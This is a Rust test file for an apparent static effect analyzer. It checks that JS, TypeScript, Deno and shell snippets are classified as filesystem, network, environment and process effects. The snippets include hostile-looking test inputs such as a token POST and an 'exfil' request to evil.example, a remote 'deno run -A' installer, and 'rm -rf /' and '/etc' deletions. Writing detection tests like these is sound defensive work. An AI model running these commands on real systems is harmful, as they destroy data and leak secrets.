use effinterp_engine::Engine;
use effinterp_proto::{
    CoverageLevel, Plan, ResourceExpr, ResourceIdentity, SourceDialect, Subject, validate_plan,
};

fn js(source: &str) -> Plan {
    analyze(source, SourceDialect::Js)
}

fn ts(source: &str) -> Plan {
    analyze(source, SourceDialect::Ts)
}

fn js_with_home(source: &str) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Source {
            language: "js".into(),
            source: source.to_string(),
            dialect: Some(SourceDialect::Js),
            cwd: Some("/app".to_string()),
            context: effinterp_proto::HostContext {
                env: [("HOME".to_string(), "/home/test".to_string())]
                    .into_iter()
                    .collect(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn js_with_causality(source: &str) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Source {
            language: "js".into(),
            source: source.to_string(),
            dialect: Some(SourceDialect::Js),
            cwd: Some("/app".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn analyze(source: &str, dialect: SourceDialect) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Source {
            language: "js".into(),
            source: source.to_string(),
            dialect: Some(dialect),
            cwd: Some("/app".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn has(plan: &Plan, op: &str, path: &str) -> bool {
    plan.effects.iter().any(|e| {
        e.operation.0 == op
            && matches!(&e.resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: p } } if p == path)
    })
}

fn count(plan: &Plan, op: &str, path: &str) -> usize {
    plan.effects
        .iter()
        .filter(|e| {
            e.operation.0 == op
                && matches!(&e.resource,
                    ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: p } } if p == path)
        })
        .count()
}

fn is_joined_env_path(resource: &ResourceExpr, env: &str, suffix: &str) -> bool {
    matches!(resource, ResourceExpr::Join { parts }
        if matches!(parts.as_slice(), [
            ResourceExpr::Environment { name },
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }
        ] if name == env && path == suffix))
}

fn ops(plan: &Plan) -> Vec<&str> {
    plan.effects
        .iter()
        .map(|e| e.operation.0.as_str())
        .collect()
}

fn has_boundary(plan: &Plan, reason: &str) -> bool {
    plan.boundaries.iter().any(|b| b.reason.as_str() == reason)
}

fn all_full(plan: &Plan) -> bool {
    plan.coverage
        .0
        .values()
        .all(|v| v.level == CoverageLevel::Full)
}

#[test]
fn fs_require_read_write_delete() {
    let plan = js(r#"
        const fs = require('fs');
        fs.readFileSync('/etc/hosts');
        fs.writeFileSync('/tmp/out', 'x');
        fs.appendFileSync('/tmp/log', 'y');
        fs.rmSync('/tmp/dir', { recursive: true });
        fs.mkdirSync('/tmp/new');
    "#);
    assert!(has(&plan, "filesystem.read", "/etc/hosts"));
    assert!(has(&plan, "filesystem.write", "/tmp/out"));
    assert!(has(&plan, "filesystem.write", "/tmp/log"));
    assert!(has(&plan, "filesystem.delete", "/tmp/dir"));
    assert!(has(&plan, "filesystem.create", "/tmp/new"));
    let append = plan.effects.iter().find(|e| matches!(&e.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/tmp/log")).unwrap();
    assert_eq!(
        append.attributes["append"],
        effinterp_proto::AttrValue::Bool(true)
    );
    let del = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.delete")
        .unwrap();
    assert_eq!(
        del.attributes["recursive"],
        effinterp_proto::AttrValue::Bool(true)
    );
}

/// Every Node spelling of a recursive directory removal carries the
/// `recursive` attribute the tree-deletion guards read, not only `rmSync`.
#[test]
fn fs_rmdir_and_promise_removals_keep_the_recursive_option() {
    let plan = js(r#"
        const fs = require('fs');
        import { promises } from 'fs';
        const fsPromises = require('fs/promises');
        const promisesMember = require('fs').promises;
        fs.rmdirSync('/sync-rmdir', { recursive: true });
        fs.rmdir('/callback-rmdir', { recursive: true }, () => {});
        fs.rm('/callback-rm', { recursive: true }, () => {});
        fs.promises.rm('/promise-rm', { recursive: true });
        fs.promises.rmdir('/promise-rmdir', { recursive: true });
        fsPromises.rmdir('/alias-rmdir', { recursive: true });
        promisesMember.rmdir('/member-rmdir', { recursive: true });
        promises.rm('/named-rm', { recursive: true });
        fs.rmdirSync('/empty-dir');
    "#);
    for path in [
        "/sync-rmdir",
        "/callback-rmdir",
        "/callback-rm",
        "/promise-rm",
        "/promise-rmdir",
        "/alias-rmdir",
        "/member-rmdir",
        "/named-rm",
    ] {
        assert!(recursive_delete(&plan, path), "{path}: {plan:?}");
    }
    assert!(has(&plan, "filesystem.delete", "/empty-dir"));
    assert!(!recursive_delete(&plan, "/empty-dir"), "{plan:?}");
    assert!(!has_boundary(&plan, "unresolved_call"), "{plan:?}");
}

#[test]
fn fs_copy_variants_read_source_and_write_destination() {
    let plan = js_with_causality(
        r#"
        import { copyFile } from 'fs/promises';
        import { cp } from 'node:fs/promises';
        const fs = require('fs');
        fs.copyFileSync('./scripts/input.js', './build/output.js');
        fs.cpSync('/sync-tree', '/sync-tree-copy', { recursive: true });
        await copyFile('/async-source', '/async-destination');
        await cp('/async-tree', '/async-tree-copy', { recursive: true });
    "#,
    );

    let pairs = [
        ("/app/scripts/input.js", "/app/build/output.js"),
        ("/sync-tree", "/sync-tree-copy"),
        ("/async-source", "/async-destination"),
        ("/async-tree", "/async-tree-copy"),
    ];
    assert_eq!(plan.effects.len(), pairs.len() * 2);
    for (source, destination) in pairs {
        assert_eq!(
            count(&plan, "filesystem.read", source),
            1,
            "source {source}"
        );
        assert_eq!(
            count(&plan, "filesystem.write", destination),
            1,
            "destination {destination}"
        );
        assert_eq!(count(&plan, "filesystem.write", source), 0);
        assert_eq!(count(&plan, "filesystem.read", destination), 0);
        let read = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.read"
                    && matches!(&effect.resource,
                        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                        if path == source)
            })
            .unwrap();
        assert_eq!(
            read.attributes.get("access_purpose"),
            Some(&effinterp_proto::AttrValue::String("program_input".into()))
        );
        let write = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.write"
                    && matches!(&effect.resource,
                        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                        if path == destination)
            })
            .unwrap();
        assert_eq!(
            write.attributes.get("disclosure"),
            Some(&effinterp_proto::AttrValue::String("contents".into()))
        );
    }
    assert_eq!(
        plan.causality
            .graph
            .as_ref()
            .unwrap()
            .edges
            .iter()
            .filter(|edge| {
                edge.reason == effinterp_proto::CausalReason::ResourceTransfer
                    && edge.assurance == effinterp_proto::CausalAssurance::Exact
            })
            .count(),
        pairs.len()
    );

    for (source, destination) in [
        ("/sync-tree", "/sync-tree-copy"),
        ("/async-tree", "/async-tree-copy"),
    ] {
        let read = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.read"
                    && matches!(&effect.resource,
                        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                        if path == source)
            })
            .unwrap();
        assert!(!read.attributes.contains_key("recursive"));
        let write = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.write"
                    && matches!(&effect.resource,
                        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                        if path == destination)
            })
            .unwrap();
        assert_eq!(
            write.attributes.get("recursive"),
            Some(&effinterp_proto::AttrValue::Bool(true))
        );
    }
}

#[test]
fn fs_copy_requires_an_fs_receiver_and_does_not_change_rename() {
    let plan = js_with_causality(
        r#"
        other.copyFileSync('/wrong-source', '/wrong-destination');
        other.cp('/wrong-tree', '/wrong-tree-copy');
        require('fs').renameSync('/rename-source', '/rename-destination');
    "#,
    );

    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0.starts_with("filesystem"))
            .count(),
        3
    );
    assert_eq!(count(&plan, "filesystem.move", "/rename-source"), 1);
    assert_eq!(count(&plan, "filesystem.delete", "/rename-source"), 1);
    assert_eq!(count(&plan, "filesystem.write", "/rename-destination"), 1);
    let destination = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert_eq!(
        destination.attributes.get("disclosure"),
        Some(&effinterp_proto::AttrValue::String("contents".into()))
    );
    assert!(
        plan.causality
            .graph
            .as_ref()
            .unwrap()
            .edges
            .iter()
            .any(|edge| {
                edge.reason == effinterp_proto::CausalReason::ResourceTransfer
                    && edge.assurance == effinterp_proto::CausalAssurance::Exact
            })
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unresolved_call")
    );
}

#[test]
fn url_file_specifier_is_a_path() {
    let plan = js(r#"
        const fs = require('fs');
        fs.readFileSync(new URL('../package.json', import.meta.url));
    "#);
    assert!(
        plan.effects.iter().any(|e| {
            e.operation.0 == "filesystem.read"
                && matches!(&e.resource,
                    ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                    if path.contains("package.json"))
        }),
        "new URL('../package.json') is a filesystem read: {:?}",
        plan.effects
    );
}

#[test]
fn named_import_from_fs_promises() {
    let plan = js(r#"
        import { rm } from 'fs/promises';
        rm('/data/cache');
    "#);
    assert!(has(&plan, "filesystem.delete", "/data/cache"));
}

#[test]
fn fs_promises_submodule() {
    let plan = js(r#"
        const fs = require('fs');
        fs.promises.unlink('/tmp/z');
    "#);
    assert!(has(&plan, "filesystem.delete", "/tmp/z"));
}

#[test]
fn relative_path_resolves_against_cwd() {
    let plan = js(r#"require('fs').writeFileSync('out.txt', '')"#);
    assert!(has(&plan, "filesystem.write", "/app/out.txt"));
}

#[test]
fn unknown_object_method_is_not_modeled() {
    // `db.rm(...)` on an unknown object must not produce a filesystem effect.
    let plan = js(r#"
        const db = getDb();
        db.rmSync('/tmp/should-not-appear');
    "#);
    assert!(
        !plan
            .effects
            .iter()
            .any(|e| e.operation.0.starts_with("filesystem"))
    );
}

#[test]
fn child_process_exec_nests_shell() {
    let plan = js(r#"require('child_process').execSync('rm -rf /data/x')"#);
    // node's JS -> child_process -> shell -> rm delete.
    assert!(has(&plan, "filesystem.delete", "/data/x"));
    assert!(
        plan.execution_graph
            .nodes
            .iter()
            .any(|n| matches!(n.subject, Subject::Shell { .. }))
    );
}

#[test]
fn child_process_execfile_nests_exec_with_args() {
    let plan = js(r#"
        const { execFileSync } = require('child_process');
        execFileSync('rm', ['-rf', '/data/y']);
    "#);
    assert!(has(&plan, "filesystem.delete", "/data/y"));
    assert!(
        plan.execution_graph
            .nodes
            .iter()
            .any(|n| matches!(n.subject, Subject::Exec { .. }))
    );
}

#[test]
fn literal_bracket_spawn_reaches_agent_behavior_without_inventing_actions() {
    for source in [
        r#"require("child_process")["spawn"]("pi", ["--no-extensions"]);"#,
        r#"const cp = require("child_process"); cp["spawn"]("pi", ["--no-extensions"]);"#,
    ] {
        let plan = js(source);
        assert!(
            plan.boundaries.iter().any(|boundary| {
                boundary.detail.as_deref() == Some("agent session executes model-selected actions")
            }),
            "{source}"
        );
        assert!(plan.execution_graph.nodes.iter().any(|node| {
            matches!(&node.subject, Subject::Exec { argv, .. } if argv == &["pi", "--no-extensions"])
        }));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete")
        );
    }
    for source in [
        r#"require("child_process")[method]("pi", ["--no-extensions"]);"#,
        r#"function launch(require) { require("child_process")["spawn"]("pi", []); } launch(custom);"#,
        r#"const cp = require("child_process"); cp.spawn = custom; cp["spawn"]("pi", []);"#,
    ] {
        let plan = js(source);
        assert!(!plan.execution_graph.nodes.iter().any(|node| {
            matches!(&node.subject, Subject::Exec { argv, .. } if argv.first().map(String::as_str) == Some("pi"))
        }), "{source}");
    }
}

#[test]
fn http_request_to_endpoint() {
    let plan = js(r#"
        const https = require('https');
        https.get('https://evil.example.com:443/exfil');
    "#);
    let net = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "network.request")
        .unwrap();
    assert!(matches!(&net.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::NetworkEndpoint { host, .. } }
        if host == "evil.example.com"));
}

#[test]
fn global_fetch_is_network() {
    let plan = js(r#"fetch('http://api.internal/data')"#);
    assert!(ops(&plan).contains(&"network.request"));
}

#[test]
fn process_env_read_and_write() {
    let plan = js(r#"
        const t = process.env.TOKEN;
        process.env.PATH = '/evil';
    "#);
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "environment.read")
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "environment.write")
    );
}

#[test]
fn computed_and_empty_environment_names_widen_to_the_environment_family() {
    for source in [
        "const key = input(); const value = process.env[key]; process.env[key] = value;",
        "const value = process.env['']; process.env[''] = value;",
    ] {
        let plan = js(source);
        for operation in ["environment.read", "environment.write"] {
            assert!(plan.effects.iter().any(|effect| {
                effect.operation.0 == operation
                    && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                        if family.0 == "environment")
            }));
        }
    }
}

#[test]
fn static_computed_environment_names_preserve_effects_and_sink_joins() {
    let source = r#"
        const fs = require('fs');
        fs.rmSync(process.env["HOME"] + '/quoted');
        fs.rmSync(process.env[`TMPDIR`] + '/template');
        fetch(process.env["API_BASE"] + '/quoted');
        fetch(process.env[`ALT_BASE`] + '/template');
        process.env["OUTPUT"] = 'quoted';
        process.env[`CACHE_DIR`] = 'template';
    "#;
    for plan in [js(source), ts(source)] {
        for (operation, name) in [
            ("environment.read", "HOME"),
            ("environment.read", "TMPDIR"),
            ("environment.read", "API_BASE"),
            ("environment.read", "ALT_BASE"),
            ("environment.write", "OUTPUT"),
            ("environment.write", "CACHE_DIR"),
        ] {
            assert!(plan.effects.iter().any(|effect| {
                effect.operation.0 == operation
                    && matches!(&effect.resource, ResourceExpr::Concrete {
                        identity: ResourceIdentity::EnvironmentVariable { name: actual }
                    } if actual == name)
            }));
        }
        assert!(!plan.effects.iter().any(|effect| {
            effect.operation.0.starts_with("environment.")
                && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                    if family.0 == "environment")
        }));

        let deletes: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .collect();
        assert_eq!(deletes.len(), 2);
        assert!(is_joined_env_path(&deletes[0].resource, "HOME", "/quoted"));
        assert!(is_joined_env_path(
            &deletes[1].resource,
            "TMPDIR",
            "/template"
        ));

        let requests: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.request")
            .collect();
        assert_eq!(requests.len(), 2);
        for (request, name, suffix) in [
            (requests[0], "API_BASE", "/quoted"),
            (requests[1], "ALT_BASE", "/template"),
        ] {
            assert!(matches!(&request.resource, ResourceExpr::Join { parts }
                if matches!(parts.as_slice(), [
                    ResourceExpr::Environment { name: actual },
                    ResourceExpr::Literal { value }
                ] if actual == name && value == suffix)));
        }
        assert!(!has_boundary(&plan, "unmodeled_dynamic"));
    }
}

#[test]
fn typescript_ambient_process_declaration_keeps_runtime_effects() {
    for declaration in [
        "declare const process: NodeJS.Process;",
        "declare var process: any;",
    ] {
        let plan = ts(&format!(
            "{declaration} const t = process.env.TOKEN; process.env.PATH = '/x';"
        ));
        assert!(ops(&plan).contains(&"environment.read"));
        assert!(ops(&plan).contains(&"environment.write"));
    }

    let global = ts(r#"
        import fs from 'node:fs'
        declare global { var process: NodeJS.Process }
        export const t = process.env.TOKEN
        process.env.PATH = '/x'
    "#);
    assert!(ops(&global).contains(&"environment.read"));
    assert!(ops(&global).contains(&"environment.write"));
}

#[test]
fn whole_environment_argument_requires_runtime_process_evidence() {
    let real = ts(r#"
        import process from 'node:process'
        resolveDefaults(process.env)
    "#);
    assert!(ops(&real).contains(&"environment.read"));

    for source in [
        "const process = { env: fake }; resolveDefaults(process.env)",
        "let process = require('node:process'); process = fake; resolveDefaults(process.env)",
        "function defaults(process) { resolveDefaults(process.env) }; defaults(fake)",
        "function defaults({ process }) { resolveDefaults(process.env) }; defaults(fake)",
        "function defaults(...process) { resolveDefaults(process.env) }; defaults(fake)",
        "function defaults() { resolveDefaults(process.env) }",
        "resolveDefaults(process['env'])",
    ] {
        assert!(
            !ops(&ts(source)).contains(&"environment.read"),
            "unsupported process receiver must not fabricate an environment read: {source}"
        );
    }
}

#[test]
fn nested_named_functions_inherit_the_lexical_process_receiver() {
    let source = r#"
        const fs = require('fs');
        function outer(process) {
            function inner() { fs.rmSync(process.env.HOME + '/nested'); }
            inner();
        }
        outer({ env: { HOME: '/tmp' } });
    "#;
    for plan in [js(source), ts(source)] {
        assert!(!ops(&plan).contains(&"environment.read"));
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .expect("filesystem delete effect");
        assert!(matches!(
            &delete.resource,
            ResourceExpr::Unresolved { family } if family.0 == "filesystem"
        ));
        assert!(has_boundary(&plan, "partial_analysis"));
        assert!(has_boundary(&plan, "unmodeled_dynamic"));
        assert!(!all_full(&plan));
    }
}

#[test]
fn local_function_arguments_use_the_callers_process_receiver() {
    let source = r#"
        const fs = require('fs');
        function useResources(path, endpoint) {
            fs.rmSync(path + '/x');
            fetch(endpoint + '/meta');
        }
        ((process) => {
            useResources(process.env.HOME, process.env.API_BASE);
        })({ env: { HOME: '/attacker', API_BASE: 'https://attacker.example' } });
    "#;
    for plan in [js(source), ts(source)] {
        assert!(!ops(&plan).contains(&"environment.read"));
        for (operation, family) in [
            ("filesystem.delete", "filesystem"),
            ("network.request", "network"),
        ] {
            let effect = plan
                .effects
                .iter()
                .find(|effect| effect.operation.0 == operation)
                .unwrap_or_else(|| panic!("{operation} effect"));
            assert!(matches!(
                &effect.resource,
                ResourceExpr::Unresolved { family: actual } if actual.0 == family
            ));
        }
        assert!(has_boundary(&plan, "partial_analysis"));
        assert!(has_boundary(&plan, "unmodeled_dynamic"));
        assert!(!all_full(&plan));
    }
}

#[test]
fn typescript_expression_wrappers_preserve_effect_resources() {
    let plan = ts(r#"
        const fs = require('fs');
        const nonNull = '/non-null';
        function load(path: string) { fs.readFileSync(path); }
        fs.readFileSync('/as' as string);
        fs.readFileSync(nonNull!);
        fs.readFileSync(<string>'/assertion');
        fs.readFileSync(('/parenthesized'));
        load('/argument' as string);
        fetch('http://wrapped.example/path' as string);
        const home = (process.env as any).HOME;
    "#);
    for path in [
        "/as",
        "/non-null",
        "/assertion",
        "/parenthesized",
        "/argument",
    ] {
        assert!(has(&plan, "filesystem.read", path), "missing {path}");
    }
    assert!(plan.effects.iter().any(|effect| matches!(
        &effect.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { host, .. }
        } if effect.operation.0 == "network.request" && host == "wrapped.example"
    )));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "environment.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: effinterp_proto::ResourceIdentity::EnvironmentVariable { name }
            } if name == "HOME")
    }));
}

#[test]
fn eval_is_opaque_boundary() {
    let plan = js(r#"eval(process.argv[2])"#);
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unmodeled_dynamic_code")
    );
    assert!(
        plan.coverage
            .0
            .values()
            .any(|c| c.level != effinterp_proto::CoverageLevel::Full)
    );
}

#[test]
fn literal_eval_body_is_entered_as_source() {
    let plan = js(r#"eval('require("fs").rmSync("/a")')"#);
    assert!(has(&plan, "filesystem.delete", "/a"));
    assert!(!has_boundary(&plan, "unmodeled_dynamic_code"));
    // A deferred compiler is not an immediate execution of its argument.
    let deferred = js(r#"Function('require("fs").rmSync("/a")')"#);
    assert!(!has(&deferred, "filesystem.delete", "/a"));
    assert!(has_boundary(&deferred, "unmodeled_dynamic_code"));
}

#[test]
fn fs_open_flags_decide_access_and_chmod_changes_metadata() {
    assert!(has(
        &js("require('fs').openSync('/a')"),
        "filesystem.read",
        "/a"
    ));
    assert!(has(
        &js("require('fs').openSync('/a', 'w')"),
        "filesystem.write",
        "/a"
    ));
    let append = js("require('fs').openSync('/a', 'a')");
    assert!(
        append
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.write" && e.attributes.contains_key("append"))
    );
    assert!(!has(&append, "filesystem.read", "/a"));
    let both = js("require('fs').open('/a', 'r+', () => {})");
    assert!(has(&both, "filesystem.read", "/a"));
    assert!(has(&both, "filesystem.write", "/a"));
    for (call, action) in [("chmodSync", "chmod"), ("chownSync", "chown")] {
        let plan = js(&format!("require('fs')['{call}']('/a', 0)"));
        assert!(has(&plan, "filesystem.metadata", "/a"));
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.as_str() == "filesystem.metadata"
                && effect.attributes.get("action")
                    == Some(&effinterp_proto::AttrValue::String(action.into()))
        }));
    }
    // A callback in the flags position is the default, not unknown flags.
    assert!(!has_boundary(
        &js("require('fs').open('/a', () => {})"),
        "unmodeled_dynamic"
    ));
    let computed = js("require('fs').openSync('/a', mode)");
    assert!(has_boundary(&computed, "unmodeled_dynamic"));
    assert!(!has(&computed, "filesystem.write", "/a"));
}

#[test]
fn supplied_environment_values_resolve_filesystem_paths() {
    let resolved = js_with_home("require('fs').rmSync(process.env.HOME + '/.cache/x')");
    assert!(has(&resolved, "filesystem.delete", "/home/test/.cache/x"));
    // os.homedir() returns $HOME whenever it is set.
    let home = js_with_home("require('fs').rmSync(require('os').homedir() + '/.cache/x')");
    assert!(has(&home, "filesystem.delete", "/home/test/.cache/x"));
    // A program that can replace the value keeps the symbolic path.
    let rewritten = js_with_home(
        "process.env.HOME = dir; require('fs').rmSync(process.env.HOME + '/.cache/x')",
    );
    assert!(
        rewritten
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.delete"
                && is_joined_env_path(&e.resource, "HOME", "/.cache/x"))
    );
    let handed_out =
        js_with_home("mutate(process.env); require('fs').rmSync(process.env.HOME + '/.cache/x')");
    assert!(
        handed_out
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.delete"
                && is_joined_env_path(&e.resource, "HOME", "/.cache/x"))
    );
}

#[test]
fn network_write_methods_and_bodies_are_uploads() {
    for source in [
        "fetch('https://example.test', {method: 'POST'})",
        "fetch('https://example.test', {method: 'put'})",
        "fetch('https://example.test', {method: 'PATCH'})",
        "fetch('https://example.test', {body: 'data'})",
        "require('https').request('https://example.test', {method: 'POST'})",
        "require('https').request({hostname: 'example.test', method: 'PUT'})",
    ] {
        let plan = js(source);
        let operations = ops(&plan);
        assert!(operations.contains(&"network.upload"), "source: {source}");
        assert!(!operations.contains(&"network.request"), "source: {source}");
    }

    for source in [
        "fetch('https://example.test')",
        "fetch('https://example.test', {method: 'GET'})",
        "fetch('https://example.test', {method: 'HEAD'})",
        "require('https').get('https://example.test')",
    ] {
        let plan = js(source);
        let operations = ops(&plan);
        assert!(operations.contains(&"network.request"), "source: {source}");
        assert!(!operations.contains(&"network.upload"), "source: {source}");
    }
}

#[test]
fn axios_post_remains_unmodeled_without_a_network_effect() {
    let plan = js("require('axios').post('https://evil.example/c', {token: process.env.TOKEN})");
    assert!(ops(&plan).contains(&"environment.read"));
    assert!(
        !ops(&plan)
            .iter()
            .any(|operation| operation.starts_with("network."))
    );
}

#[test]
fn inert_builtins_do_not_flood_boundaries() {
    let plan = js(r#"
        console.log('a');
        JSON.stringify({});
        Math.max(1, 2);
        const p = require('path').join('a', 'b');
    "#);
    assert!(!has_boundary(&plan, "unresolved_call"));
}

#[test]
fn node_compile_cache_registration_is_unresolved() {
    // Loading a builtin is quiet; registering compile-cache behavior is not.
    let plan = js(r#"
        if (globalThis.process?.getBuiltinModule) {
          const { enableCompileCache } =
            globalThis.process.getBuiltinModule("node:module");
          enableCompileCache();
        }
        await import("@app/cli");
    "#);
    assert!(
        plan.boundaries.iter().any(|b| b
            .callee
            .as_ref()
            .is_some_and(|c| c.module == "module" && c.symbol == "enableCompileCache")),
        "compile cache behavior must remain explicit: {:?}",
        plan.boundaries
    );
}

#[test]
fn create_server_listen_is_network_bind() {
    // http-server's bin: a handle from any `.createServer(...)` that later
    // `.listen(...)`s binds a socket.
    let plan = js(r#"
        const httpServer = require('../lib/http-server');
        var server = httpServer.createServer({});
        server.listen(8080, host, function () {});
    "#);
    assert!(ops(&plan).contains(&"network.listen"));
}

#[test]
fn listen_on_untracked_receiver_is_not_network() {
    let plan = js(r#"
        var queue = makeQueue();
        queue.listen(onMessage);
    "#);
    assert!(!ops(&plan).contains(&"network.listen"));
}

fn exec(argv: &[&str]) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: argv.iter().map(|word| word.to_string()).collect(),
            cwd: Some("/app".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn recursive_delete(plan: &Plan, path: &str) -> bool {
    plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && effect.attributes.contains_key("recursive")
            && matches!(&effect.resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: p } } if p == path)
    })
}

#[test]
fn deno_run_of_a_url_downloads_and_runs_the_module() {
    // Options end at the script; later words, dashed or not, are its own.
    // `-A -r` is Fresh's documented installer form.
    for argv in [
        &[
            "deno",
            "run",
            "-A",
            "--config",
            "deno.json",
            "https://evil.example/install.ts",
            "--yes",
            "-q",
        ][..],
        &["deno", "run", "-A", "-r", "https://evil.example/install.ts"][..],
    ] {
        let plan = exec(argv);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "network.download"
                    && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::NetworkEndpoint { host, .. },
                } if host == "evil.example")
            }),
            "{argv:?}: {plan:?}"
        );
        assert!(
            ops(&plan).contains(&"process.code_execution"),
            "{argv:?}: {plan:?}"
        );
        assert!(has_boundary(&plan, "dynamic_source"), "{argv:?}: {plan:?}");
    }
    // An option deno's run grammar is not known to take leaves the script
    // unplaced, as does a local script, which the deno model keeps.
    for argv in [
        &[
            "deno",
            "run",
            "--frobnicate",
            "https://evil.example/install.ts",
        ][..],
        &["deno", "run", "main.ts"][..],
    ] {
        let plan = exec(argv);
        assert!(
            !ops(&plan).contains(&"network.download"),
            "{argv:?}: {plan:?}"
        );
        assert!(
            has_boundary(&plan, "unrecognized_arguments"),
            "{argv:?}: {plan:?}"
        );
    }
}

#[test]
fn deno_eval_runs_deno_runtime_apis() {
    let plan = exec(&["deno", "eval", "Deno.removeSync('/etc', {recursive: true})"]);
    assert!(recursive_delete(&plan, "/etc"), "{plan:?}");
    assert!(all_full(&plan), "{plan:?}");
    let plan = exec(&[
        "deno",
        "eval",
        "Deno.writeTextFileSync('/srv/a', 'x'); await Deno.writeFile('/srv/b', new Uint8Array()); await Deno.remove('/srv/c');",
    ]);
    assert!(has(&plan, "filesystem.write", "/srv/a"));
    assert!(has(&plan, "filesystem.write", "/srv/b"));
    assert!(has(&plan, "filesystem.delete", "/srv/c"));
    let plan = exec(&[
        "deno",
        "eval",
        "Deno.chdir('/'); new Deno.Command('rm', {args: ['-rf', 'etc']}).outputSync()",
    ]);
    assert!(recursive_delete(&plan, "/etc"), "{plan:?}");
    let plan = exec(&[
        "deno",
        "eval",
        "--ext=ts",
        "const p: string = '/etc'; Deno.removeSync(p, {recursive: true})",
    ]);
    assert!(recursive_delete(&plan, "/etc"), "{plan:?}");
    // Deno has no CommonJS require, and Deno is not a Node global.
    for argv in [
        &[
            "deno",
            "eval",
            "require('fs').rmSync('/etc', {recursive: true})",
        ][..],
        &["node", "-e", "Deno.removeSync('/etc', {recursive: true})"][..],
    ] {
        let plan = exec(argv);
        assert!(
            !ops(&plan).contains(&"filesystem.delete"),
            "{argv:?}: {plan:?}"
        );
        assert!(has_boundary(&plan, "unresolved_call"), "{argv:?}: {plan:?}");
    }
}

/// Host facts that show `/gone` absent; anything else is unobserved.
struct MissingGone;

impl effinterp_engine::ObservationResolver for MissingGone {
    fn observe(
        &self,
        query: &effinterp_proto::ObservationQuery,
        _: effinterp_engine::ObservationBudget,
    ) -> effinterp_proto::ObservationOutcome {
        let effinterp_proto::ObservationQuery::Path { path } = query else {
            return effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            );
        };
        if path == "/gone" {
            effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
                entry: path.clone(),
                kind: effinterp_proto::PathKind::Missing,
                followed: effinterp_proto::Fact::Unavailable(
                    effinterp_proto::ObservationRefusal::Unobserved,
                ),
                executable: None,
            })
        } else {
            effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            )
        }
    }
}

#[test]
fn subprocess_in_a_host_missing_cwd_never_runs() {
    let run = |source: &str| {
        Engine::new()
            .analyze_with_observations(
                &Subject::Exec {
                    argv: vec!["node".into(), "-e".into(), source.into()],
                    cwd: Some("/app".to_string()),
                    context: Default::default(),
                },
                None,
                None,
                Some(std::sync::Arc::new(MissingGone)),
            )
            .unwrap()
    };
    for source in [
        "require('child_process').spawnSync('rm', ['-rf', '/'], {cwd: '/gone'})",
        "require('child_process').execSync('rm -rf /', {cwd: '/gone'})",
    ] {
        assert!(!recursive_delete(&run(source), "/"), "{source}");
    }
    let unobserved = run("require('child_process').spawnSync('rm', ['-rf', '/'], {cwd: '/other'})");
    assert!(recursive_delete(&unobserved, "/"));
}

#[test]
fn subprocess_cwd_option_places_the_child() {
    for argv in [
        &[
            "node",
            "-e",
            "require('child_process').spawn('rm', ['-rf', 'etc'], {cwd: '/'})",
        ][..],
        &[
            "node",
            "-e",
            "require('child_process').execSync('rm -rf etc', {cwd: '/'})",
        ][..],
        &[
            "node",
            "-e",
